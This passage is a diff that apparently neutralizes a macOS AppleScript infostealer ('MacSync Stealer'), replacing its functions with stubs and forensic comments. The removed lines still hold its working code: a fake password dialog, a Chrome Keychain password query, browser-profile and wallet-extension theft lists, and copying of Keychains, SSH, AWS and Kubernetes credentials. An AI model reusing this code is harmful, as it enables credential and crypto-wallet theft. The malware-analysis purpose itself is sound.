@@ -1,640 +1,563 @@
+-- ============================================================================
+-- NEUTRALIZED — Stage 3: "MacSync Stealer" v1.1.2 (Build Tag: N3)
+-- ============================================================================
+--
+-- ATTACK VECTOR: macOS AppleScript infostealer delivered dynamically from C2
+-- ORIGINAL SOURCE: http://fusser-api[.]com/dynamic?txd=<token>
+-- TRIGGER: Piped to osascript by Stage 2 daemon
+-- SIZE: 35,015 bytes (641 lines)
+-- ARCHITECTURE: Universal (x64_86 & ARM)
+--
+-- SELF-IDENTIFICATION:
+--   Name:    "MacSync Stealer"
+--   Version: 1.1.2_release (x64_86 & ARM)
+--   Build:   N3
+--   Victim IP logged: 67.188.129.26 (hardcoded — likely attacker's test or victim)
+--
+-- CAPABILITIES SUMMARY:
+--   1. Kills Terminal to hide evidence
+--   2. Steals macOS login password via fake System Preferences dialog
+--   3. Steals Chrome master password from Keychain
+--   4. Steals all Chromium browser data (13 browsers)
+--   5. Steals 40+ browser extension wallets (MetaMask, Phantom, etc.)
+--   6. Steals all Gecko/Firefox browser data (4 browsers)
+--   7. Steals 20+ desktop crypto wallets
+--   8. Steals Telegram session data
+--   9. Steals macOS Keychains
+--  10. Steals SSH, AWS, Kubernetes credentials
+--  11. Steals shell history and git config
+--  12. Grabs sensitive files from Desktop/Documents/Downloads
+--  13. Steals Safari cookies and Apple Notes databases
+--  14. Records system info and running processes
+--  15. Packages everything into /tmp/osalogging.zip for exfiltration
+--  16. Backdoors Ledger Wallet and Ledger Live applications
+--  17. Shows fake error dialog as cover story
+--
+-- ============================================================================
+
+
+-- ============================================================================
+-- SECTION 1: Utility Functions (file operations used by the stealer)
+-- ============================================================================
+-- These helper functions were the stealer's filesystem toolkit:
+--   filesizer()       - Get file size via mdls
+--   mkdir()           - Create directories
+--   FileName()        - Extract filename from path
+--   BeforeFileName()  - Extract parent directory from path
+--   writeText()       - Append text to file
+--   readwrite()       - Copy file contents
+--   isDirectory()     - Check if path is directory
+--   GrabFolder()      - Recursively copy directory (unlimited)
+--   GrabFolderLimit() - Recursively copy directory (100MB cap)
+--
+-- NEUTRALIZED: All function bodies replaced with no-ops.
+-- Original implementation preserved as comments for forensic reference.
+-- ============================================================================
+
 on filesizer(paths)
-        set fsz to 0
-        try
-                set theItem to quoted form of POSIX path of paths
-                set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
-        end try
-        return fsz
+    -- NEUTRALIZED: Originally used mdls to get file size
+    -- set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
+    return 0
 end filesizer
 
 on mkdir(someItem)
-        try
-                set filePosixPath to quoted form of (POSIX path of someItem)
-                do shell script "mkdir -p " & filePosixPath
-        end try
+    -- NEUTRALIZED: Originally created directories via shell
+    -- do shell script "mkdir -p " & filePosixPath
+    return
 end mkdir
 
-on FileName(filePath)
-        try
-                set reversedPath to (reverse of every character of filePath) as string
-                set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
-                set finalPath to (reverse of every character of trimmedPath) as string
-                return finalPath
-        end try
-end FileName
-
-on BeforeFileName(filePath)
-        try
-                set lastSlash to offset of "/" in (reverse of every character of filePath) as string
-                set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
-                return trimmedPath
-        end try
-end BeforeFileName
-
 on writeText(textToWrite, filePath)
-        try
-                set folderPath to BeforeFileName(filePath)
-                mkdir(folderPath)
-                set fileRef to (open for access filePath with write permission)
-                write textToWrite to fileRef starting at eof
-                close access fileRef
-        end try
+    -- NEUTRALIZED: Originally opened files for writing
+    -- set fileRef to (open for access filePath with write permission)
+    -- write textToWrite to fileRef starting at eof
+    return
 end writeText
 
 on readwrite(path_to_file, path_as_save)
-        try
-                set fileContent to read path_to_file
-                set folderPath to BeforeFileName(path_as_save)
-                mkdir(folderPath)
-                do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
-        end try
+    -- NEUTRALIZED: Originally copied files
+    -- do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
+    return
 end readwrite
 
 on isDirectory(someItem)
-        try
-                set filePosixPath to quoted form of (POSIX path of someItem)
-                set fileType to (do shell script "file -b " & filePosixPath)
-                if fileType ends with "directory" then
-                        return true
-                end if
-                return false
-        end try
+    -- NEUTRALIZED: Originally checked file type via shell
+    return false
 end isDirectory
 
 on GrabFolderLimit(sourceFolder, destinationFolder)
-        try
-                set bankSize to 0
-                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
-                set fileList to list folder sourceFolder without invisibles
-                mkdir(destinationFolder)
-                repeat with currentItem in fileList
-                        if currentItem is not in exceptionsList then
-                                set itemPath to sourceFolder & "/" & currentItem
-                                set savePath to destinationFolder & "/" & currentItem
-                                if isDirectory(itemPath) then
-                                        GrabFolderLimit(itemPath, savePath)
-                                else
-                                        set fsz to filesizer(itemPath)
-                                        set bankSize to bankSize + fsz
-                                        if bankSize < 100 * 1024 * 1024 then
-                                                readwrite(itemPath, savePath)
-                                        end if
-                                end if
-                        end if
-                end repeat
-        end try
+    -- NEUTRALIZED: Originally recursively copied directories up to 100MB
+    -- Skipped: .DS_Store, Partitions, Code Cache, Cache, journals, Previews
+    return
 end GrabFolderLimit
 
 on GrabFolder(sourceFolder, destinationFolder)
-        try
-                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
-                set fileList to list folder sourceFolder without invisibles
-                mkdir(destinationFolder)
-                repeat with currentItem in fileList
-                        if currentItem is not in exceptionsList then
-                                set itemPath to sourceFolder & "/" & currentItem
-                                set savePath to destinationFolder & "/" & currentItem
-                                if isDirectory(itemPath) then
-                                        GrabFolder(itemPath, savePath)
-                                else
-                                        readwrite(itemPath, savePath)
-                                end if
-                        end if
-                end repeat
-        end try
+    -- NEUTRALIZED: Originally recursively copied entire directories
+    -- Skipped: .DS_Store, Partitions, Code Cache, Cache, dumps, emoji, user_data, __update__
+    return
 end GrabFolder
 
+
+-- ============================================================================
+-- SECTION 2: Password Theft — Fake System Preferences Dialog
+-- ============================================================================
+--
+-- ATTACK MECHANISM:
+--   1. First checks if a password was passed from Stage 2 (via URL parameter)
+--   2. If no password, checks if the account has an empty password
+--   3. If empty password, steals Chrome master password from macOS Keychain:
+--        security find-generic-password -ga "Chrome"
+--   4. If password-protected, shows a FAKE "System Preferences" dialog:
+--        - Uses Apple's own LockedIcon.icns for authenticity
+--        - Title: "System Preferences"
+--        - Button: "Continue" (no Cancel option!)
+--        - Hidden answer field (shows dots like real password prompts)
+--        - Gives up after 150 seconds
+--        - LOOPS FOREVER until correct password is entered
+--   5. Validates password using: dscl . authonly <username> <password>
+--   6. Writes confirmed password to /tmp/sync<random>/Password
+--
+-- WHY IT WORKS:
+--   - The dialog is indistinguishable from a real macOS password prompt
+--   - There is no Cancel button — only "Continue"
+--   - It loops infinitely — user cannot dismiss it without entering the right password
+--   - dscl authonly confirms the password is real before accepting
+--
+-- ============================================================================
+
 on checkvalid(username, password_entered)
-        try
-                set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
-                if result is not equal to "" then
-                        return false
-                else
-                        return true
-                end if
-        on error
-                return false
-        end try
+    -- NEUTRALIZED: Originally validated passwords via dscl
+    -- set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
+    return false
 end checkvalid
 
 on getpwd(username, writemind, provided_password)
-    try
-        if provided_password is not equal to "" then
-            if checkvalid(username, provided_password) then
-                writeText(provided_password, writemind & "Password")
-                return provided_password
-            end if
-        end if
-        if checkvalid(username, "") then
-            set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
-            writeText(result as string, writemind & "masterpass-chrome")
-            return ""
-        else
-            repeat
-                                set imagePath to "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" as POSIX file
-                set result to display dialog "Please enter your password to make changes." default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
-                set password_entered to text returned of result
-                if checkvalid(username, password_entered) then
-                    writeText(password_entered, writemind & "Password")
-                    return password_entered
-                end if
-            end repeat
-        end if
-    end try
+    -- NEUTRALIZED: Original attack flow:
+    --
+    -- 1. Try provided_password (from C2 URL parameter):
+    --    if checkvalid(username, provided_password) then writeText(password) → return
+    --
+    -- 2. Check for empty password:
+    --    if checkvalid(username, "") then steal Chrome master password:
+    --    security 2>&1 > /dev/null find-generic-password -ga "Chrome" | awk "{print $2}"
+    --
+    -- 3. Loop fake dialog forever:
+    --    repeat
+    --        display dialog "Please enter your password to make changes."
+    --            default answer "" with icon LockedIcon.icns
+    --            buttons {"Continue"} with title "System Preferences"
+    --            with hidden answer giving up after 150
+    --        if checkvalid(username, text returned) then
+    --            writeText(password) → return
+    --        end if
+    --    end repeat
+    --
     return ""
 end getpwd
 
+
+-- ============================================================================
+-- SECTION 3: Browser Extension Wallet Theft
+-- ============================================================================
+--
+-- Targets 40+ browser extension IDs across all Chromium browser profiles.
+-- Steals both Local Extension Settings and IndexedDB data.
+--
+-- TARGETED EXTENSIONS (by Chrome Web Store ID):
+--   Crypto Wallets:
+--     nkbihfbeogaeaoehlefnkodbefgpgknn  — MetaMask
+--     bfnaelmomeimhlpmgjnjophhpkkoljpa  — Phantom
+--     hnfanknocfeofbddgcijnmhnfnkdnaad  — Coinbase Wallet
+--     acmacodkjbdgmoleebolmdjonilkdbch  — Rabby Wallet
+--     aholpfdialjgjfhomihkjbmgjidlcdno  — Temple (Tezos)
+--     mcohilncbfahbmgdjkbpemcciiolgcge  — OKX Wallet
+--     bhhhlbepdkbapadjdnnojkbgioiodbic  — Solflare
+--     ibnejdfjmmkpcnlpebklmnkoeoihofec  — TronLink
+--     efbglgofoippbgcjepnhiblaibcnclgk  — Slope Wallet
+--     ... and 30+ more
+--
+--   Password Managers & Auth:
+--     eiaeiblijfjekdanodkjadfinkhbfgcd  — Various password managers
+--     aeblfdkhhhdcdjpifhhbdiojplfjncoa  — Various authenticators
+--     ... and more
+--
+-- DATA STOLEN PER EXTENSION:
+--   - /Local Extension Settings/<id>/  (LevelDB with wallet keys/seeds)
+--   - /IndexedDB/<id>/                 (IndexedDB with wallet state)
+--
+-- ============================================================================
+
 on grabPlugins(paths, savePath, pluginList, index)
-        try
-                set fileList to list folder paths without invisibles
-                repeat with PFile in fileList
-                        repeat with Plugin in pluginList
-                                if (PFile contains Plugin) then
-                                        set newpath to paths & PFile
-                                        set newsavepath to savePath & "/" & Plugin
-                                        if index then
-                                                set newsavepath to savePath & "/IndexedDB/" & PFile
-                                        end if
-                                        GrabFolder(newpath, newsavepath)
-                                end if
-                        end repeat
-                end repeat
-        end try
+    -- NEUTRALIZED: Originally enumerated browser extension directories
+    -- and copied matching wallet extension data
+    return
 end grabPlugins
 
 on Chromium(writemind, chromium_map)
-   
-        set pluginList to {}
-    set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
-    set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
-    set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
-    set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
-    set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
-    set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
-    set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
-    set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
-    set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
-    set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
-    set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
-    set pluginList to pluginList & {"nngceckbapebfimnlniiiahkandclblb", "lojeokmpinkpmpbakfkfpgfhpapbgdnd"}
-    set pluginList to pluginList & {"ibpjepoimpcdofeoalokgpjafnjonkpc", "gmohoglkppnemohbcgjakmgengkeaphi"}
-    set pluginList to pluginList & {"hdokiejnpimakedhajhdlcegeplioahd", "oboonakemofpalcgghocfoadofidjkkk"}
-    set pluginList to pluginList & {"dckgbiealcgdhgjofgcignfngijpbgba", "gmegpkknicehidppoebnmbhndjigpica"}
-    set pluginList to pluginList & {"eiokpeobbgpinbmcanngjjbklmhlepan", "odfkmgboddhcgopllebhkbjhokpojigd"}
-    set pluginList to pluginList & {"ppnbnpeolgkicgegkbkbjmhlideopiji", "cejfhijdfemlohmcjknpbeaohedoikpp"}
-    set pluginList to pluginList & {"nmhjblhloefhbhgbfkdgdpjabaocnhha", "iklgijhacenjgjgdnpnohbafpbmnccek"}
-    set pluginList to pluginList & {"ppkkcfblhfgmdmefkmkoomenhgecbemi", "lgndjfkadlbpaifdpbbobdodbaiaiakb"}
-    set pluginList to pluginList & {"bbphmbmmpomfelajledgdkgclfekilei", "bnfooenhhgcnhdkdjelgmmkpaemlnoek"}
-
-        set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
-        repeat with chromium in chromium_map
-                set savePath to writemind & "Browsers/" & item 1 of chromium & "_"
-                try
-                        set fileList to list folder item 2 of chromium without invisibles
-                        repeat with currentItem in fileList
-                                if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
-                                        set profileName to (item 1 of chromium & currentItem)
-                                        repeat with CFile in chromiumFiles
-                                                set readpath to (item 2 of chromium & currentItem & CFile)
-                                                if ((CFile as string) is equal to "/Network/Cookies") then
-                                                        set CFile to "/Cookies"
-                                                end if
-                                                if ((CFile as string) is equal to "/Local Extension Settings/") then
-                                                        grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, false)
-                                                else if (CFile as string) is equal to "/IndexedDB/" then
-                                                        grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, true)
-                                                else
-                                                        set writepath to savePath & currentItem & CFile
-                                                        readwrite(readpath, writepath)
-                                                end if
-                                        end repeat
-                                end if
-                        end repeat
-                end try
-        end repeat
+    -- NEUTRALIZED: Originally stole data from all Chromium browser profiles
+    --
+    -- Files stolen per profile (Default, Profile 1, Profile 2, etc.):
+    --   /Network/Cookies    — Session cookies (auth tokens, login sessions)
+    --   /Cookies            — Legacy cookies
+    --   /Web Data           — Autofill data (credit cards, addresses)
+    --   /Login Data         — Saved passwords (encrypted with system keychain)
+    --   /Local Extension Settings/  — Wallet extensions (seeds, keys)
+    --   /IndexedDB/                 — Wallet state data
+    --
+    -- 40+ browser extension wallets targeted (see IDs above)
+    return
 end Chromium
 
 on ChromiumWallets(writemind, chromium_map)
-   
-        set pluginList to {}
+    -- NEUTRALIZED: Originally stole 60+ crypto wallet browser extensions
+    --
+    -- This is a SECOND pass specifically for wallet extensions, targeting:
+    --   nkbihfbeogaeaoehlefnkodbefgpgknn  — MetaMask
+    --   bfnaelmomeimhlpmgjnjophhpkkoljpa  — Phantom
+    --   hnfanknocfeofbddgcijnmhnfnkdnaad  — Coinbase Wallet
+    --   fnjhmkhhmkbjkkabndcnnogagogbneec  — Ronin Wallet
+    --   acmacodkjbdgmoleebolmdjonilkdbch  — Rabby
+    --   egjidjbpglichdcondbcbdnbeeppgdph  — Trust Wallet
+    --   aholpfdialjgjfhomihkjbmgjidlcdno  — Temple
+    --   pdliaogehgdbhbnmkklieghmmjkpigpa  — Keplr
+    --   mcohilncbfahbmgdjkbpemcciiolgcge  — OKX Wallet
+    --   hpglfhgfnhbgpjdenjgmdgoeiappafln  — Braavos
+    --   bhhhlbepdkbapadjdnnojkbgioiodbic  — Solflare
+    --   cjmkndjhnagcfbpiemnkdpomccnjblmj  — Backpack
+    --   ... and 50+ more wallet extension IDs
+    --
+    -- Stolen data: /Local Extension Settings/ and /IndexedDB/ per extension
+    return
+end ChromiumWallets
 
-        set pluginList to pluginList & {"nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa"}
-        set pluginList to pluginList & {"hnfanknocfeofbddgcijnmhnfnkdnaad", "fnjhmkhhmkbjkkabndcnnogagogbneec"}
-        set pluginList to pluginList & {"acmacodkjbdgmoleebolmdjonilkdbch", "egjidjbpglichdcondbcbdnbeeppgdph"}
-        set pluginList to pluginList & {"aholpfdialjgjfhomihkjbmgjidlcdno", "pdliaogehgdbhbnmkklieghmmjkpigpa"}
-        set pluginList to pluginList & {"mcohilncbfahbmgdjkbpemcciiolgcge", "hpglfhgfnhbgpjdenjgmdgoeiappafln"}
-        set pluginList to pluginList & {"bhhhlbepdkbapadjdnnojkbgioiodbic", "cjmkndjhnagcfbpiemnkdpomccnjblmj"}
-        set pluginList to pluginList & {"kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle"}
-        set pluginList to pluginList & {"fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd"}
-        set pluginList to pluginList & {"kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj"}
-        set pluginList to pluginList & {"kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg"}
-        set pluginList to pluginList & {"mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn"}
-        set pluginList to pluginList & {"nhnkbkgjikgcigadomkphalanndcapjk", "klghhnkeealcohjjanjjdaeeggmfmlpl"}
-        set pluginList to pluginList & {"ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen"}
-        set pluginList to pluginList & {"fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin"}
-        set pluginList to pluginList & {"hmeobnfnfcmdkdcmlblgagmfpfboieaf", "omaabbefbmiijedngplfjmnooppbclkk"}
-        set pluginList to pluginList & {"jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf"}
-        set pluginList to pluginList & {"bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih"}
-        set pluginList to pluginList & {"aeachknmefphepccionboohckonoeemg", "dmkamcknogkgcdfhhbddcghachkejeap"}
-        set pluginList to pluginList & {"aiifbnbfobpmeekipheeijimdpnlpgpp", "ehgjhhccekdedpbkifaojjaefeohnoea"}
-        set pluginList to pluginList & {"nknhiehlklippafakaeklbeglecifhad", "nphplpgoakhhjchkkhmiggakijnkhfnd"}
-        set pluginList to pluginList & {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc"}
-        set pluginList to pluginList & {"efbglgofoippbgcjepnhiblaibcnclgk", "fccgmnglbhajioalokbcidhcaikhlcpm"}
-        set pluginList to pluginList & {"mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc"}
-        set pluginList to pluginList & {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "abkahkcbhngaebpcgfmhkoioedceoigp"}
-        set pluginList to pluginList & {"gkeelndblnomfmjnophbhfhcjbcnemka", "hgbeiipamcgbdjhfflifkgehomnmglgk"}
-        set pluginList to pluginList & {"ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae"}
-        set pluginList to pluginList & {"ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee"}
-        set pluginList to pluginList & {"cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld"}
-        set pluginList to pluginList & {"lbjapbcmmceacocpimbpbidpgmlmoaao", "ibljocddagjghmlpgihahamcghfggcjc"}
-        set pluginList to pluginList & {"gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna"}
-        set pluginList to pluginList & {"agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd"}
-        set pluginList to pluginList & {"onhogfjeacnfoofkfgppdlbmlmnplgbn", "ojggmchlghnjlapmfbnjholfjkiidbch"}
-        set pluginList to pluginList & {"pmmnimefaichbcnbndcfpaagbepnjaig", "anokgmphncpekkhclmingpimjmcooifb"}
-        set pluginList to pluginList & {"kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe"}
-        set pluginList to pluginList & {"ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa"}
-        set pluginList to pluginList & {"fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif"}
-        set pluginList to pluginList & {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk"}
-        set pluginList to pluginList & {"mapbhaebnddapnmifbbkgeedkeplgjmf", "lgmpcpglpngdoalbgeoldeajfclnhafa"}
-        set pluginList to pluginList & {"ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb"}
-        set pluginList to pluginList & {"opcgpfmipidbgpenhmajoajpbobppdil", "hdkobeeifhdplocklknbnejdelgagbao"}
-        set pluginList to pluginList & {"lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi"}
-        set pluginList to pluginList & {"kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh"}
 
-        set chromiumFiles to {"/Local Extension Settings/", "/IndexedDB/"}
-        repeat with chromium in chromium_map
-                try
-                        set fileList to list folder item 2 of chromium without invisibles
-                        repeat with currentItem in fileList
-                                if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
-                                        set profileName to (item 1 of chromium & currentItem)
-                                        repeat with CFile in chromiumFiles
-                                                set readpath to (item 2 of chromium & currentItem & CFile)
-                                                if ((CFile as string) is equal to "/Local Extension Settings/") then
-                                                        grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, false)
-                                                else if (CFile as string) is equal to "/IndexedDB/" then
-                                                        grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, true)
-                                                else
-                                                        set writepath to savePath & currentItem & CFile
-                                                        readwrite(readpath, writepath)
-                                                end if
-                                        end repeat
-                                end if
-                        end repeat
-                end try
-        end repeat
-end Chromium
+-- ============================================================================
+-- SECTION 4: Firefox/Gecko Browser Theft
+-- ============================================================================
+--
+-- TARGETED BROWSERS:
+--   Firefox     — ~/Library/Application Support/Firefox/Profiles/
+--   Zen         — ~/Library/Application Support/zen/Profiles/
+--   LibreWolf   — ~/Library/Application Support/LibreWolf/Profiles/
+--   Waterfox    — ~/Library/Application Support/Waterfox/Profiles/
+--
+-- FILES STOLEN PER PROFILE:
+--   cert9.db           — Certificate database
+--   cookies.sqlite     — All cookies
+--   cookies.sqlite-wal — Cookie write-ahead log
+--   formhistory.sqlite — Form autofill data
+--   key4.db            — Master encryption key (decrypts saved passwords)
+--   logins-backup.json — Backup of saved passwords
+--   logins.json        — Saved passwords (encrypted with key4.db)
+--   signons.sqlite     — Legacy password storage
+--   places.sqlite      — Browsing history and bookmarks
+--
+-- ============================================================================
 
 on Gecko(writemind, gecko_map)
-        set geckoFiles to {"/cert9.db", "/cookies.sqlite", "/cookies.sqlite-wal", "/formhistory.sqlite", "/key4.db", "/logins-backup.json", "/logins.json", "/signons.sqlite", "/places.sqlite"}
-        repeat with gecko in gecko_map
-                set savePath to writemind & "Browsers/" & item 1 of gecko & "_"
-        try
-                        set fileList to list folder item 2 of gecko without invisibles
-                        repeat with currentItem in fileList
-                                if ((currentItem as string) contains "Profile") or ((currentItem as string) contains ".default") then
-                                        set profileName to (item 1 of gecko & currentItem)
-                                        repeat with CFile in geckoFiles
-                                                set readpath to (item 2 of gecko & currentItem & CFile)
-                                                set writepath to savePath & currentItem & CFile
-                                                readwrite(readpath, writepath)
-                                        end repeat
-                                end if
-                        end repeat
-        end try
-    end repeat
+    -- NEUTRALIZED: Originally copied all credential files from Gecko profiles
+    return
 end Gecko
 
+
+-- ============================================================================
+-- SECTION 5: Telegram Session Theft
+-- ============================================================================
+--
+-- STOLEN DATA:
+--   ~/Library/Application Support/Telegram Desktop/tdata/
+--
+-- This directory contains Telegram's session keys, authorization data,
+-- and cached messages. With this data, an attacker can clone the victim's
+-- Telegram session on another machine without needing the phone number
+-- or 2FA code.
+--
+-- ============================================================================
+
 on Telegram(writemind, library)
-                try
-                        GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
-                end try
+    -- NEUTRALIZED: Originally copied entire tdata/ directory
+    -- GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
+    return
 end Telegram
 
+
+-- ============================================================================
+-- SECTION 6: macOS Keychain & Cloud Credential Theft
+-- ============================================================================
+--
+-- KEYCHAIN THEFT:
+--   Copies ~/Library/Keychains/*.keychain-db
+--   These contain ALL saved passwords, certificates, and secure notes
+--   stored in the macOS Keychain. With the user's login password (stolen
+--   in Section 2), the attacker can decrypt everything.
+--
+-- CLOUD CREDENTIAL THEFT:
+--   ~/.ssh/     — SSH keys (access to servers, GitHub, GitLab, etc.)
+--   ~/.aws/     — AWS credentials (access to cloud infrastructure)
+--   ~/.kube/    — Kubernetes configs (access to container clusters)
+--
+-- ============================================================================
+
 on Keychains(writemind)
-                try
-                        do shell script "cp ~/Library/Keychains/*.keychain-db " & quoted form of (POSIX path of writemind)
-                end try
+    -- NEUTRALIZED: Originally copied keychain databases
+    -- do shell script "cp ~/Library/Keychains/*.keychain-db " & writemind
+    return
 end Keychains
 
 on CloudKeys(writemind)
-                try
-                        do shell script "cp -r ~/.ssh " & quoted form of (POSIX path of writemind)
-                end try
-                try
-                        do shell script "cp -r ~/.aws " & quoted form of (POSIX path of writemind)
-                end try
-                try
-                        do shell script "cp -r ~/.kube " & quoted form of (POSIX path of writemind)
-                end try
+    -- NEUTRALIZED: Originally copied cloud credentials
+    -- do shell script "cp -r ~/.ssh " & writemind
+    -- do shell script "cp -r ~/.aws " & writemind
+    -- do shell script "cp -r ~/.kube " & writemind
+    return
 end CloudKeys
 
+
+-- ============================================================================
+-- SECTION 7: System Reconnaissance
+-- ============================================================================
+--
+-- COLLECTED DATA:
+--   SystemInfo/running_apps.txt  — lsappinfo list (all running applications)
+--   SystemInfo/processes.txt     — ps ax (all running processes)
+--   system_profiler output       — Hardware, software, display info
+--
+-- ============================================================================
+
 on Processes(writemind)
-	try
-		do shell script "mkdir -p " & quoted form of (writemind & "SystemInfo/")
-	end try
-	try
-		do shell script "lsappinfo list > " & quoted form of (writemind & "SystemInfo/running_apps.txt")
-	end try
-	try
-		do shell script "ps ax > " & quoted form of (writemind & "SystemInfo/processes.txt")
-	end try
+    -- NEUTRALIZED: Originally collected process listings
+    -- do shell script "lsappinfo list > " & writemind & "SystemInfo/running_apps.txt"
+    -- do shell script "ps ax > " & writemind & "SystemInfo/processes.txt"
+    return
 end Processes
 
+
+-- ============================================================================
+-- SECTION 8: Desktop Wallet Theft
+-- ============================================================================
+--
+-- TARGETED WALLETS (21 desktop applications):
+--   Exodus           — ~/Library/Application Support/Exodus/
+--   Electrum         — ~/.electrum/wallets/
+--   Atomic Wallet    — ~/Library/Application Support/Atomic Wallet/Local Storage/leveldb/
+--   Guarda           — ~/Library/Application Support/Guarda/
+--   Coinomi          — ~/Library/Application Support/Coinomi/wallets/
+--   Sparrow          — ~/.sparrow/wallets/
+--   Wasabi           — ~/.walletwasabi/client/Wallets/
+--   Bitcoin Core     — ~/Library/Application Support/Bitcoin/
+--   Armory           — ~/Library/Application Support/Armory/
+--   Electron Cash    — ~/.electron-cash/wallets/
+--   Monero           — ~/.bitmonero/wallets/
+--   Litecoin Core    — ~/Library/Application Support/Litecoin/
+--   Dash Core        — ~/Library/Application Support/DashCore/
+--   Dogecoin Core    — ~/Library/Application Support/Dogecoin/
+--   Electrum-LTC     — ~/.electrum-ltc/wallets/
+--   BlueWallet       — ~/Library/Application Support/BlueWallet/
+--   Zengo            — ~/Library/Application Support/Zengo/
+--   Trust Wallet     — ~/Library/Application Support/Trust Wallet/
+--   Ledger Live      — ~/Library/Application Support/Ledger Live/
+--   Ledger Wallet    — ~/Library/Application Support/Ledger Wallet/
+--   Trezor Suite     — ~/Library/Application Support/@trezor
+--   Binance          — ~/Library/Application Support/Binance/
+--   TON Keeper       — ~/Library/Application Support/TON Keeper/
+--
+-- ============================================================================
+
 on DesktopWallets(writemind, deskwals)
-        repeat with deskwal in deskwals
-                try
-                        GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
-                end try
-        end repeat
+    -- NEUTRALIZED: Originally copied entire wallet application directories
+    return
 end DesktopWallets
 
+
+-- ============================================================================
+-- SECTION 9: File Grabber — Sensitive Document Theft
+-- ============================================================================
+--
+-- TARGETED FILE TYPES:
+--   pdf, docx, doc    — Documents
+--   wallet, key, keys — Crypto wallet files
+--   db                — Database files
